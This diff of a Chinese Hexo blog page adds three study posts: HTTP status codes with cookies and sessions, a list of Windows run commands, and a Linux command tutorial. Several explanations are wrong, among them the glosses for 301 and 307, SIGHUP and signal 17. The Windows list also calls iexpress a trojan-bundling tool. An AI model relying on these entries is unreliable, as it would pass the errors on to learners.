@@ -353,6 +353,845 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/22/http基础知识/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/22/http基础知识/" class="post-title-link" itemprop="url">http基础知识</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-22 09:04:08" itemprop="dateCreated datePublished" datetime="2019-02-22T09:04:08+08:00">2019-02-22</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-27 22:27:35" itemprop="dateModified" datetime="2019-02-27T22:27:35+08:00">2019-02-27</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://www.cnblogs.com/hggen/p/6264858.html" target="_blank" rel="noopener">HTTP协议简单解析及WEB请求过程</a><br><a href="http://www.blogjava.net/zjusuyong/articles/304788.html" target="_blank" rel="noopener">http协议学习</a><br><a href="https://blog.csdn.net/ynd_sg/article/details/82182951" target="_blank" rel="noopener">http字段总结</a><br><a href="https://www.cnblogs.com/laowenBlog/p/6096241.html" target="_blank" rel="noopener">HTTP 头字段总结</a></p>
+<h1 id="http的状态响应码"><a href="#http的状态响应码" class="headerlink" title="http的状态响应码"></a>http的状态响应码</h1><p><img src="http基础知识/状态码.png" alt=""></p>
+<h2 id="1-：请求收到，继续处理"><a href="#1-：请求收到，继续处理" class="headerlink" title="1**：请求收到，继续处理"></a>1**：请求收到，继续处理</h2><p>100——客户必须继续发出请求</p>
+<p>101——客户要求服务器根据请求转换HTTP协议版本</p>
+<h2 id="2-：操作成功收到，分析、接受"><a href="#2-：操作成功收到，分析、接受" class="headerlink" title="2**：操作成功收到，分析、接受"></a>2**：操作成功收到，分析、接受</h2><p>200——交易成功<br>201——提示知道新文件的URL</p>
+<p>202——接受和处理、但处理未完成</p>
+<p>203——返回信息不确定或不完整</p>
+<p>204——请求收到，但返回信息为空</p>
+<p>205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件</p>
+<p>206——服务器已经完成了部分用户的GET请求</p>
+<h2 id="3-：完成此请求必须进一步处理"><a href="#3-：完成此请求必须进一步处理" class="headerlink" title="3**：完成此请求必须进一步处理"></a>3**：完成此请求必须进一步处理</h2><p>300——请求的资源可在多处得到</p>
+<p>301——删除请求数据</p>
+<p>302——在其他地址发现了请求数据</p>
+<p>303——建议客户访问其他URL或访问方式</p>
+<p>304——客户端已经执行了GET，但文件未变化</p>
+<p>305——请求的资源必须从服务器指定的地址得到</p>
+<p>306——前一版本HTTP中使用的代码，现行版本中不再使用</p>
+<p>307——申明请求的资源临时性删除</p>
+<h2 id="4-：请求包含一个错误语法或不能完成"><a href="#4-：请求包含一个错误语法或不能完成" class="headerlink" title="4**：请求包含一个错误语法或不能完成"></a>4**：请求包含一个错误语法或不能完成</h2><p>400——错误请求，如语法错误</p>
+<p>401——未授权</p>
+<p>HTTP 401.1 - 未授权：登录失败</p>
+<p>　　HTTP 401.2 - 未授权：服务器配置问题导致登录失败</p>
+<p>　　HTTP 401.3 - ACL 禁止访问资源</p>
+<p>　　HTTP 401.4 - 未授权：授权被筛选器拒绝</p>
+<p>HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败</p>
+<p>402——保留有效ChargeTo头响应</p>
+<p>403——禁止访问</p>
+<p>HTTP 403.1 禁止访问：禁止可执行访问</p>
+<p>　　HTTP 403.2 - 禁止访问：禁止读访问</p>
+<p>　　HTTP 403.3 - 禁止访问：禁止写访问</p>
+<p>　　HTTP 403.4 - 禁止访问：要求 SSL</p>
+<p>　　HTTP 403.5 - 禁止访问：要求 SSL 128</p>
+<p>　　HTTP 403.6 - 禁止访问：IP 地址被拒绝</p>
+<p>　　HTTP 403.7 - 禁止访问：要求客户证书</p>
+<p>　　HTTP 403.8 - 禁止访问：禁止站点访问</p>
+<p>　　HTTP 403.9 - 禁止访问：连接的用户过多</p>
+<p>　　HTTP 403.10 - 禁止访问：配置无效</p>
+<p>　　HTTP 403.11 - 禁止访问：密码更改</p>
+<p>　　HTTP 403.12 - 禁止访问：映射器拒绝访问</p>
+<p>　　HTTP 403.13 - 禁止访问：客户证书已被吊销</p>
+<p>　　HTTP 403.15 - 禁止访问：客户访问许可过多</p>
+<p>　　HTTP 403.16 - 禁止访问：客户证书不可信或者无效</p>
+<p>HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效</p>
+<p>404——没有发现文件、查询或URl</p>
+<p>405——用户在Request-Line字段定义的方法不允许</p>
+<p>406——根据用户发送的Accept拖，请求资源不可访问</p>
+<p>407——类似401，用户必须首先在代理服务器上得到授权</p>
+<p>408——客户端没有在用户指定的饿时间内完成请求</p>
+<p>409——对当前资源状态，请求不能完成</p>
+<p>410——服务器上不再有此资源且无进一步的参考地址</p>
+<p>411——服务器拒绝用户定义的Content-Length属性请求</p>
+<p>412——一个或多个请求头字段在当前请求中错误</p>
+<p>413——请求的资源大于服务器允许的大小</p>
+<p>414——请求的资源URL长于服务器允许的长度</p>
+<p>415——请求资源不支持请求项目格式</p>
+<p>416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段</p>
+<p>417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</p>
+<h2 id="5-：服务器执行一个完全有效请求失败"><a href="#5-：服务器执行一个完全有效请求失败" class="headerlink" title="5**：服务器执行一个完全有效请求失败"></a>5**：服务器执行一个完全有效请求失败</h2><p>　　HTTP 500 - 内部服务器错误</p>
+<p>　　HTTP 500.100 - 内部服务器错误 - ASP 错误</p>
+<p>　　HTTP 500-11 服务器关闭</p>
+<p>　　HTTP 500-12 应用程序重新启动</p>
+<p>　　HTTP 500-13 - 服务器太忙</p>
+<p>　　HTTP 500-14 - 应用程序无效</p>
+<p>　　HTTP 500-15 - 不允许请求 global.asa</p>
+<p>　　Error 501 - 未实现</p>
+<p>HTTP 502 - 网关错误</p>
+<h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><p>Cookie和Session都为了用来保存状态信息，都是保存客户端状态的机制，它们都是为了解决HTTP无状态的问题而所做的努力。</p>
+<p>Session可以用Cookie来实现，也可以用URL回写的机制来实现。用Cookie来实现的Session可以认为是对Cookie更高级的应用。</p>
+<h2 id="两者比较"><a href="#两者比较" class="headerlink" title="两者比较"></a>两者比较</h2><p>Cookie和Session有以下明显的不同点：</p>
+<p>1）Cookie将状态保存在客户端，Session将状态保存在服务器端；</p>
+<p>2）Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器。Cookie最早在RFC2109中实现，后续RFC2965做了增强。网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies。Session并没有在HTTP的协议中定义；</p>
+<p>3）Session是针对每一个用户的，变量的值保存在服务器上，用一个sessionID来区分是哪个用户session变量,这个值是通过用户的浏览器在访问的时候返回给服务器，当客户禁用cookie时，这个值也可能设置为由get来返回给服务器；</p>
+<p>4）就安全性来说：当你访问一个使用session 的站点，同时在自己机子上建立一个cookie，建议在服务器端的SESSION机制更安全些.因为它不会任意读取客户存储的信息。</p>
+<h2 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h2><p>Session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。</p>
+<p>当程序需要为某个客户端的请求创建一个session的时候，服务器首先检查这个客户端的请求里是否已包含了一个session标识 - 称为 session id，如果已包含一个session id则说明以前已经为此客户端创建过session，服务器就按照session id把这个 session检索出来使用（如果检索不到，可能会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个 session id将被在本次响应中返回给客户端保存。</p>
+<h2 id="Session的实现方式"><a href="#Session的实现方式" class="headerlink" title="Session的实现方式"></a>Session的实现方式</h2><h3 id="使用Cookie来实现"><a href="#使用Cookie来实现" class="headerlink" title="使用Cookie来实现"></a>使用Cookie来实现</h3><p>服务器给每个Session分配一个唯一的JSESSIONID，并通过Cookie发送给客户端。</p>
+<p>当客户端发起新的请求的时候，将在Cookie头中携带这个JSESSIONID。这样服务器能够找到这个客户端对应的Session。</p>
+<p>流程如下图所示：<br><img src="http://www.blogjava.net/images/blogjava_net/amigoxie/40799/o_http%e5%8d%8f%e8%ae%ae%e5%ad%a6%e4%b9%a0%e5%92%8c%e6%80%bb%e7%bb%93%e7%b3%bb%e5%88%97-3-1.jpg" alt=""></p>
+<h3 id="使用URL回显来实现"><a href="#使用URL回显来实现" class="headerlink" title="使用URL回显来实现"></a>使用URL回显来实现</h3><p>URL回写是指服务器在发送给浏览器页面的所有链接中都携带JSESSIONID的参数，这样客户端点击任何一个链接都会把JSESSIONID带会服务器。</p>
+<p>如果直接在浏览器输入服务端资源的url来请求该资源，那么Session是匹配不到的。</p>
+<p>Tomcat对Session的实现，是一开始同时使用Cookie和URL回写机制，如果发现客户端支持Cookie，就继续使用Cookie，停止使用URL回写。如果发现Cookie被禁用，就一直使用URL回写。jsp开发处理到Session的时候，对页面中的链接记得使用response.encodeURL() 。</p>
+<h2 id="在J2EE项目中Session失效的几种情况"><a href="#在J2EE项目中Session失效的几种情况" class="headerlink" title="在J2EE项目中Session失效的几种情况"></a>在J2EE项目中Session失效的几种情况</h2><p>1）Session超时：Session在指定时间内失效，例如30分钟，若在30分钟内没有操作，则Session会失效，例如在web.xml中进行了如下设置：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-config&gt; </span><br><span class="line">        &lt;session-timeout&gt;30&lt;/session-timeout&gt; //单位：分钟</span><br><span class="line">    &lt;/session-config&gt;</span><br></pre></td></tr></table></figure></p>
+<p>2）使用session.invalidate()明确的去掉Session。</p>
+<h2 id="与Cookie相关的HTTP扩展头"><a href="#与Cookie相关的HTTP扩展头" class="headerlink" title="与Cookie相关的HTTP扩展头"></a>与Cookie相关的HTTP扩展头</h2><p>1）Cookie：客户端将服务器设置的Cookie返回到服务器；</p>
+<p>2）Set-Cookie：服务器向客户端设置Cookie；</p>
+<p>3）Cookie2 (RFC2965)）：客户端指示服务器支持Cookie的版本；</p>
+<p>4）Set-Cookie2 (RFC2965)：服务器向客户端设置Cookie。</p>
+<h2 id="Cookie的流程"><a href="#Cookie的流程" class="headerlink" title="Cookie的流程"></a>Cookie的流程</h2><p>服务器在响应消息中用Set-Cookie头将Cookie的内容回送给客户端，客户端在新的请求中将相同的内容携带在Cookie头中发送给服务器。从而实现会话的保持。</p>
+<p>流程如下图所示：</p>
+<p><img src="http://www.blogjava.net/images/blogjava_net/amigoxie/40799/o_http%e5%8d%8f%e8%ae%ae%e5%ad%a6%e4%b9%a0%e5%92%8c%e6%80%bb%e7%bb%93%e7%b3%bb%e5%88%97-3-2.jpg" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/Windows常用命令/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/21/Windows常用命令/" class="post-title-link" itemprop="url">Windows常用命令</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-21 21:22:29" itemprop="dateCreated datePublished" datetime="2019-02-21T21:22:29+08:00">2019-02-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-02 10:40:08" itemprop="dateModified" datetime="2019-03-02T10:40:08+08:00">2019-03-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Windows常用命令<br><a href="https://www.cnblogs.com/qianjingchen/p/9549508.html" target="_blank" rel="noopener">https://www.cnblogs.com/qianjingchen/p/9549508.html</a><br><a href="http://www.cnblogs.com/sbaicl/archive/2013/03/05/2944001.html" target="_blank" rel="noopener">http://www.cnblogs.com/sbaicl/archive/2013/03/05/2944001.html</a><br>下面是有关常用网络命令的一篇博客<br><a href="https://blog.csdn.net/wz_cow/article/details/80864032" target="_blank" rel="noopener">https://blog.csdn.net/wz_cow/article/details/80864032</a></p>
+<p>附CMD比较常用命令集：<br>winver———检查Windows版本<br>wmimgmt.msc—-打开windows管理体系结构(WMI)<br>wupdmgr——–windows更新程序<br>wscript——–windows脚本宿主设置<br>write———-写字板<br>winmsd———系统信息<br>wiaacmgr——-扫描仪和照相机向导<br>winchat——–XP自带局域网聊天<br>mem.exe——–显示内存使用情况<br>Msconfig.exe—系统配置实用程序<br>mplayer2——-简易widnows media player<br>mspaint——–画图板<br>mstsc———-远程桌面连接<br>mplayer2——-媒体播放机<br>magnify——–放大镜实用程序<br>mmc————打开控制台<br>mobsync——–同步命令<br>dxdiag———检查DirectX信息<br>drwtsn32—— 系统医生<br>devmgmt.msc— 设备管理器<br>dfrg.msc——-磁盘碎片整理程序<br>diskmgmt.msc—磁盘管理实用程序<br>dcomcnfg——-打开系统组件服务<br>ddeshare——-打开DDE共享设置<br>dvdplay——–DVD播放器<br>net stop messenger—–停止信使服务<br>net start messenger—-开始信使服务<br>notepad——–打开记事本<br>nslookup——-网络管理的工具向导<br>ntbackup——-系统备份和还原<br>narrator——-屏幕“讲述人”<br>ntmsmgr.msc—-移动存储管理器<br>ntmsoprq.msc—移动存储管理员操作请求<br>netstat -an—-(TC)命令检查接口<br>syncapp——–创建一个公文包<br>sysedit——–系统配置编辑器<br>sigverif——-文件签名验证程序<br>sndrec32——-录音机<br>shrpubw——–创建共享文件夹<br>secpol.msc—–本地安全策略<br>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码<br>services.msc—本地服务设置<br>Sndvol32——-音量控制程序<br>sfc.exe——–系统文件检查器<br>sfc /scannow—windows文件保护<br>tsshutdn——-60秒倒计时关机命令<br>tourstart——xp简介（安装完成后出现的漫游xp程序）<br>taskmgr——–任务管理器<br>eventvwr——-事件查看器<br>eudcedit——-造字程序<br>explorer——-打开资源管理器<br>packager——-对象包装程序<br>perfmon.msc—-计算机性能监测程序<br>progman——–程序管理器<br>regedit.exe—-注册表<br>rsop.msc——-组策略结果集<br>regedt32——-注册表编辑器<br>rononce -p —-15秒关机<br>regsvr32 /u *.dll—-停止dll文件运行<br>regsvr32 /u zipfldr.dll——取消ZIP支持<br>cmd.exe——–CMD命令提示符<br>chkdsk.exe—–Chkdsk磁盘检查<br>certmgr.msc—-证书管理实用程序<br>calc———–启动计算器<br>charmap——–启动字符映射表<br>cliconfg——-SQL SERVER 客户端网络实用程序<br>Clipbrd——–剪贴板查看器<br>conf———–启动netmeeting<br>compmgmt.msc—计算机管理<br>cleanmgr——-垃圾整理<br>ciadv.msc——索引服务程序<br>osk————打开屏幕键盘<br>odbcad32——-ODBC数据源管理器<br>oobe/msoobe /a—-检查XP是否激活<br>lusrmgr.msc—-本机用户和组<br>logoff———注销命令<br>iexpress——-木马捆绑工具，系统自带<br>Nslookup——-IP地址侦测器<br>fsmgmt.msc—–共享文件夹管理器<br>utilman——–辅助工具管理器</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/Linux常用命令/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/02/21/Linux常用命令/" class="post-title-link" itemprop="url">Linux常用命令</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-02-21 21:22:13" itemprop="dateCreated datePublished" datetime="2019-02-21T21:22:13+08:00">2019-02-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-02 19:30:46" itemprop="dateModified" datetime="2019-03-02T19:30:46+08:00">2019-03-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://blog.csdn.net/ljianhui/article/details/11100625/#" target="_blank" rel="noopener">来源https://blog.csdn.net/ljianhui/article/details/11100625/#</a><br><a href="https://www.linuxidc.com/Linux/2018-04/151801.htm" target="_blank" rel="noopener">Linux常用命令详解-目录文件操作命令</a></p>
+<h1 id="1、cd命令"><a href="#1、cd命令" class="headerlink" title="1、cd命令"></a>1、cd命令</h1><p>这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
+<p>cd /root/Docements # 切换到目录/root/Docements<br>cd ./path          # 切换到当前目录下的path目录中，“.”表示当前目录<br>cd ../path         # 切换到上层目录中的path目录中，“..”表示上一层目录</p>
+<h1 id="2、ls命令"><a href="#2、ls命令" class="headerlink" title="2、ls命令"></a>2、ls命令</h1><p>这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
+<p>-l ：列出长数据串，包含文件的属性与权限数据等<br>-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用）<br>-d ：仅列出目录本身，而不是列出目录的文件数据<br>-h ：将文件容量以较易读的方式（GB，kB等）列出来<br>-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来<br>注：这些参数也可以组合使用，下面举两个例子：</p>
+<p>ls -l #以长数据串的形式列出当前目录下的数据文件和目录<br>ls -lR #以长数据串的形式列出当前目录下的所有文件</p>
+<h1 id="3、grep命令"><a href="#3、grep命令" class="headerlink" title="3、grep命令"></a>3、grep命令</h1><p>该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等，它的简单语法为<br>grep [-acinv] [–color=auto] ‘查找字符串’ filename<br>它的常用参数如下：</p>
+<p>-a ：将binary文件以text文件的方式查找数据<br>-c ：计算找到‘查找字符串’的次数<br>-i ：忽略大小写的区别，即把大小写视为相同<br>-v ：反向选择，即显示出没有‘查找字符串’内容的那一行</p>
+<ul>
+<li>例如：</li>
+<li>取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色<br>grep –color=auto ‘MANPATH’ /etc/man.config</li>
+<li>把ls -l的输出中包含字母file（不区分大小写）的内容输出<br>ls -l | grep -i file<h1 id="4、find命令"><a href="#4、find命令" class="headerlink" title="4、find命令"></a>4、find命令</h1>find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：</li>
+</ul>
+<p>find [PATH] [option] [action]</p>
+<ul>
+<li>与时间有关的参数：<br>-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；<br>-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；<br>-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；<br>-newer file : 列出比file还要新的文件名</li>
+<li><p>例如：<br>find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件</p>
+</li>
+<li><p>与用户或用户组名有关的参数：<br>-user name : 列出文件所有者为name的文件<br>-group name : 列出文件所属用户组为name的文件<br>-uid n : 列出文件所有者为用户ID为n的文件<br>-gid n : 列出文件所属用户组为用户组ID为n的文件</p>
+</li>
+<li><p>例如：<br>find /home/ljianhui -user ljianhui * 在目录/home/ljianhui中找出所有者为ljianhui的文件</p>
+</li>
+<li><p>与文件权限及名称有关的参数：<br>-name filename ：找出文件名为filename的文件<br>-size [+-]SIZE ：找出比SIZE还要大（+）或小（-）的文件<br>-tpye TYPE ：查找文件的类型为TYPE的文件，TYPE的值主要有：一般文件（f)、设备文件（b、c）、</p>
+<pre><code>目录（d）、连接文件（l）、socket（s）、FIFO管道文件（p）；
+</code></pre><p>-perm mode ：查找文件权限刚好等于mode的文件，mode用数字表示，如0755；<br>-perm -mode ：查找文件权限必须要全部包括mode权限的文件，mode用数字表示<br>-perm +mode ：查找文件权限包含任一mode的权限的文件，mode用数字表示</p>
+</li>
+<li>例如：<br>find / -name passwd # 查找文件名为passwd的文件<br>find . -perm 0755 # 查找当前目录中文件权限的0755的文件<br>find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte<h1 id="5、cp命令"><a href="#5、cp命令" class="headerlink" title="5、cp命令"></a>5、cp命令</h1>该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：</li>
+</ul>
+<p>-a ：将文件的特性一起复制<br>-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份<br>-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行<br>-r ：递归持续复制，用于目录的复制行为<br>-u ：目标文件与源文件有差异时才会复制<br>例如 ：</p>
+<p>cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2<br>cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中</p>
+<h1 id="6、mv命令"><a href="#6、mv命令" class="headerlink" title="6、mv命令"></a>6、mv命令</h1><p>该命令用于移动文件、目录或更名，move之意，它的常用参数如下：</p>
+<p>-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖<br>-i ：若目标文件已经存在，就会询问是否覆盖<br>-u ：若目标文件已经存在，且比目标文件新，才会更新<br>注：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。</p>
+<p>例如：</p>
+<p>mv file1 file2 file3 dir # 把文件file1、file2、file3移动到目录dir中<br>mv file1 file2 # 把文件file1重命名为file2</p>
+<h1 id="7、rm命令"><a href="#7、rm命令" class="headerlink" title="7、rm命令"></a>7、rm命令</h1><p>该命令用于删除文件或目录，remove之间，它的常用参数如下：</p>
+<p>-f ：就是force的意思，忽略不存在的文件，不会出现警告消息<br>-i ：互动模式，在删除前会询问用户是否操作<br>-r ：递归删除，最常用于目录删除，它是一个非常危险的参数<br>例如：</p>
+<p>rm -i file # 删除文件file，在删除之前会询问是否进行该操作<br>rm -fr dir # 强制删除目录dir中的所有文件</p>
+<h1 id="8、ps命令"><a href="#8、ps命令" class="headerlink" title="8、ps命令"></a>8、ps命令</h1><p>该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
+<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
+<p>ps aux # 查看系统所有的进程数据<br>ps ax # 查看不与terminal有关的所有进程<br>ps -lA # 查看系统所有的进程数据<br>ps axjf # 查看连同一部分进程树状态</p>
+<h1 id="9、kill命令"><a href="#9、kill命令" class="headerlink" title="9、kill命令"></a>9、kill命令</h1><p>该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：<br>kill -signal PID<br>signal的常用参数如下：<br>注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
+<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
+<ul>
+<li>以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1 </li>
+<li>重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID<h1 id="10、killall命令"><a href="#10、killall命令" class="headerlink" title="10、killall命令"></a>10、killall命令</h1>该命令用于向一个命令启动的进程发送一个信号，它的一般语法如下：<br>killall [-iIe] [command name]<br>它的参数如下：</li>
+</ul>
+<p>-i ：交互式的意思，若需要删除时，会询问用户<br>-e ：表示后面接的command name要一致，但command name不能超过15个字符<br>-I ：命令名称忽略大小写</p>
+<ul>
+<li>例如：<br>killall -SIGHUP syslogd # 重新启动syslogd<h1 id="11、file命令"><a href="#11、file命令" class="headerlink" title="11、file命令"></a>11、file命令</h1>该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：</li>
+</ul>
+<p>file filename<br>*例如：<br>file ./test</p>
+<h1 id="12、tar命令"><a href="#12、tar命令" class="headerlink" title="12、tar命令"></a>12、tar命令</h1><p>该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
+<p>-c ：新建打包文件<br>-t ：查看打包文件的内容含有哪些文件名<br>-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中<br>-j ：通过bzip2的支持进行压缩/解压缩<br>-z ：通过gzip的支持进行压缩/解压缩<br>-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来<br>-f filename ：filename为要处理的文件<br>-C dir ：指定压缩/解压缩的目录dir<br>上面的解说可以已经让你晕过去了，但是通常我们只需要记住下面三条命令即可：</p>
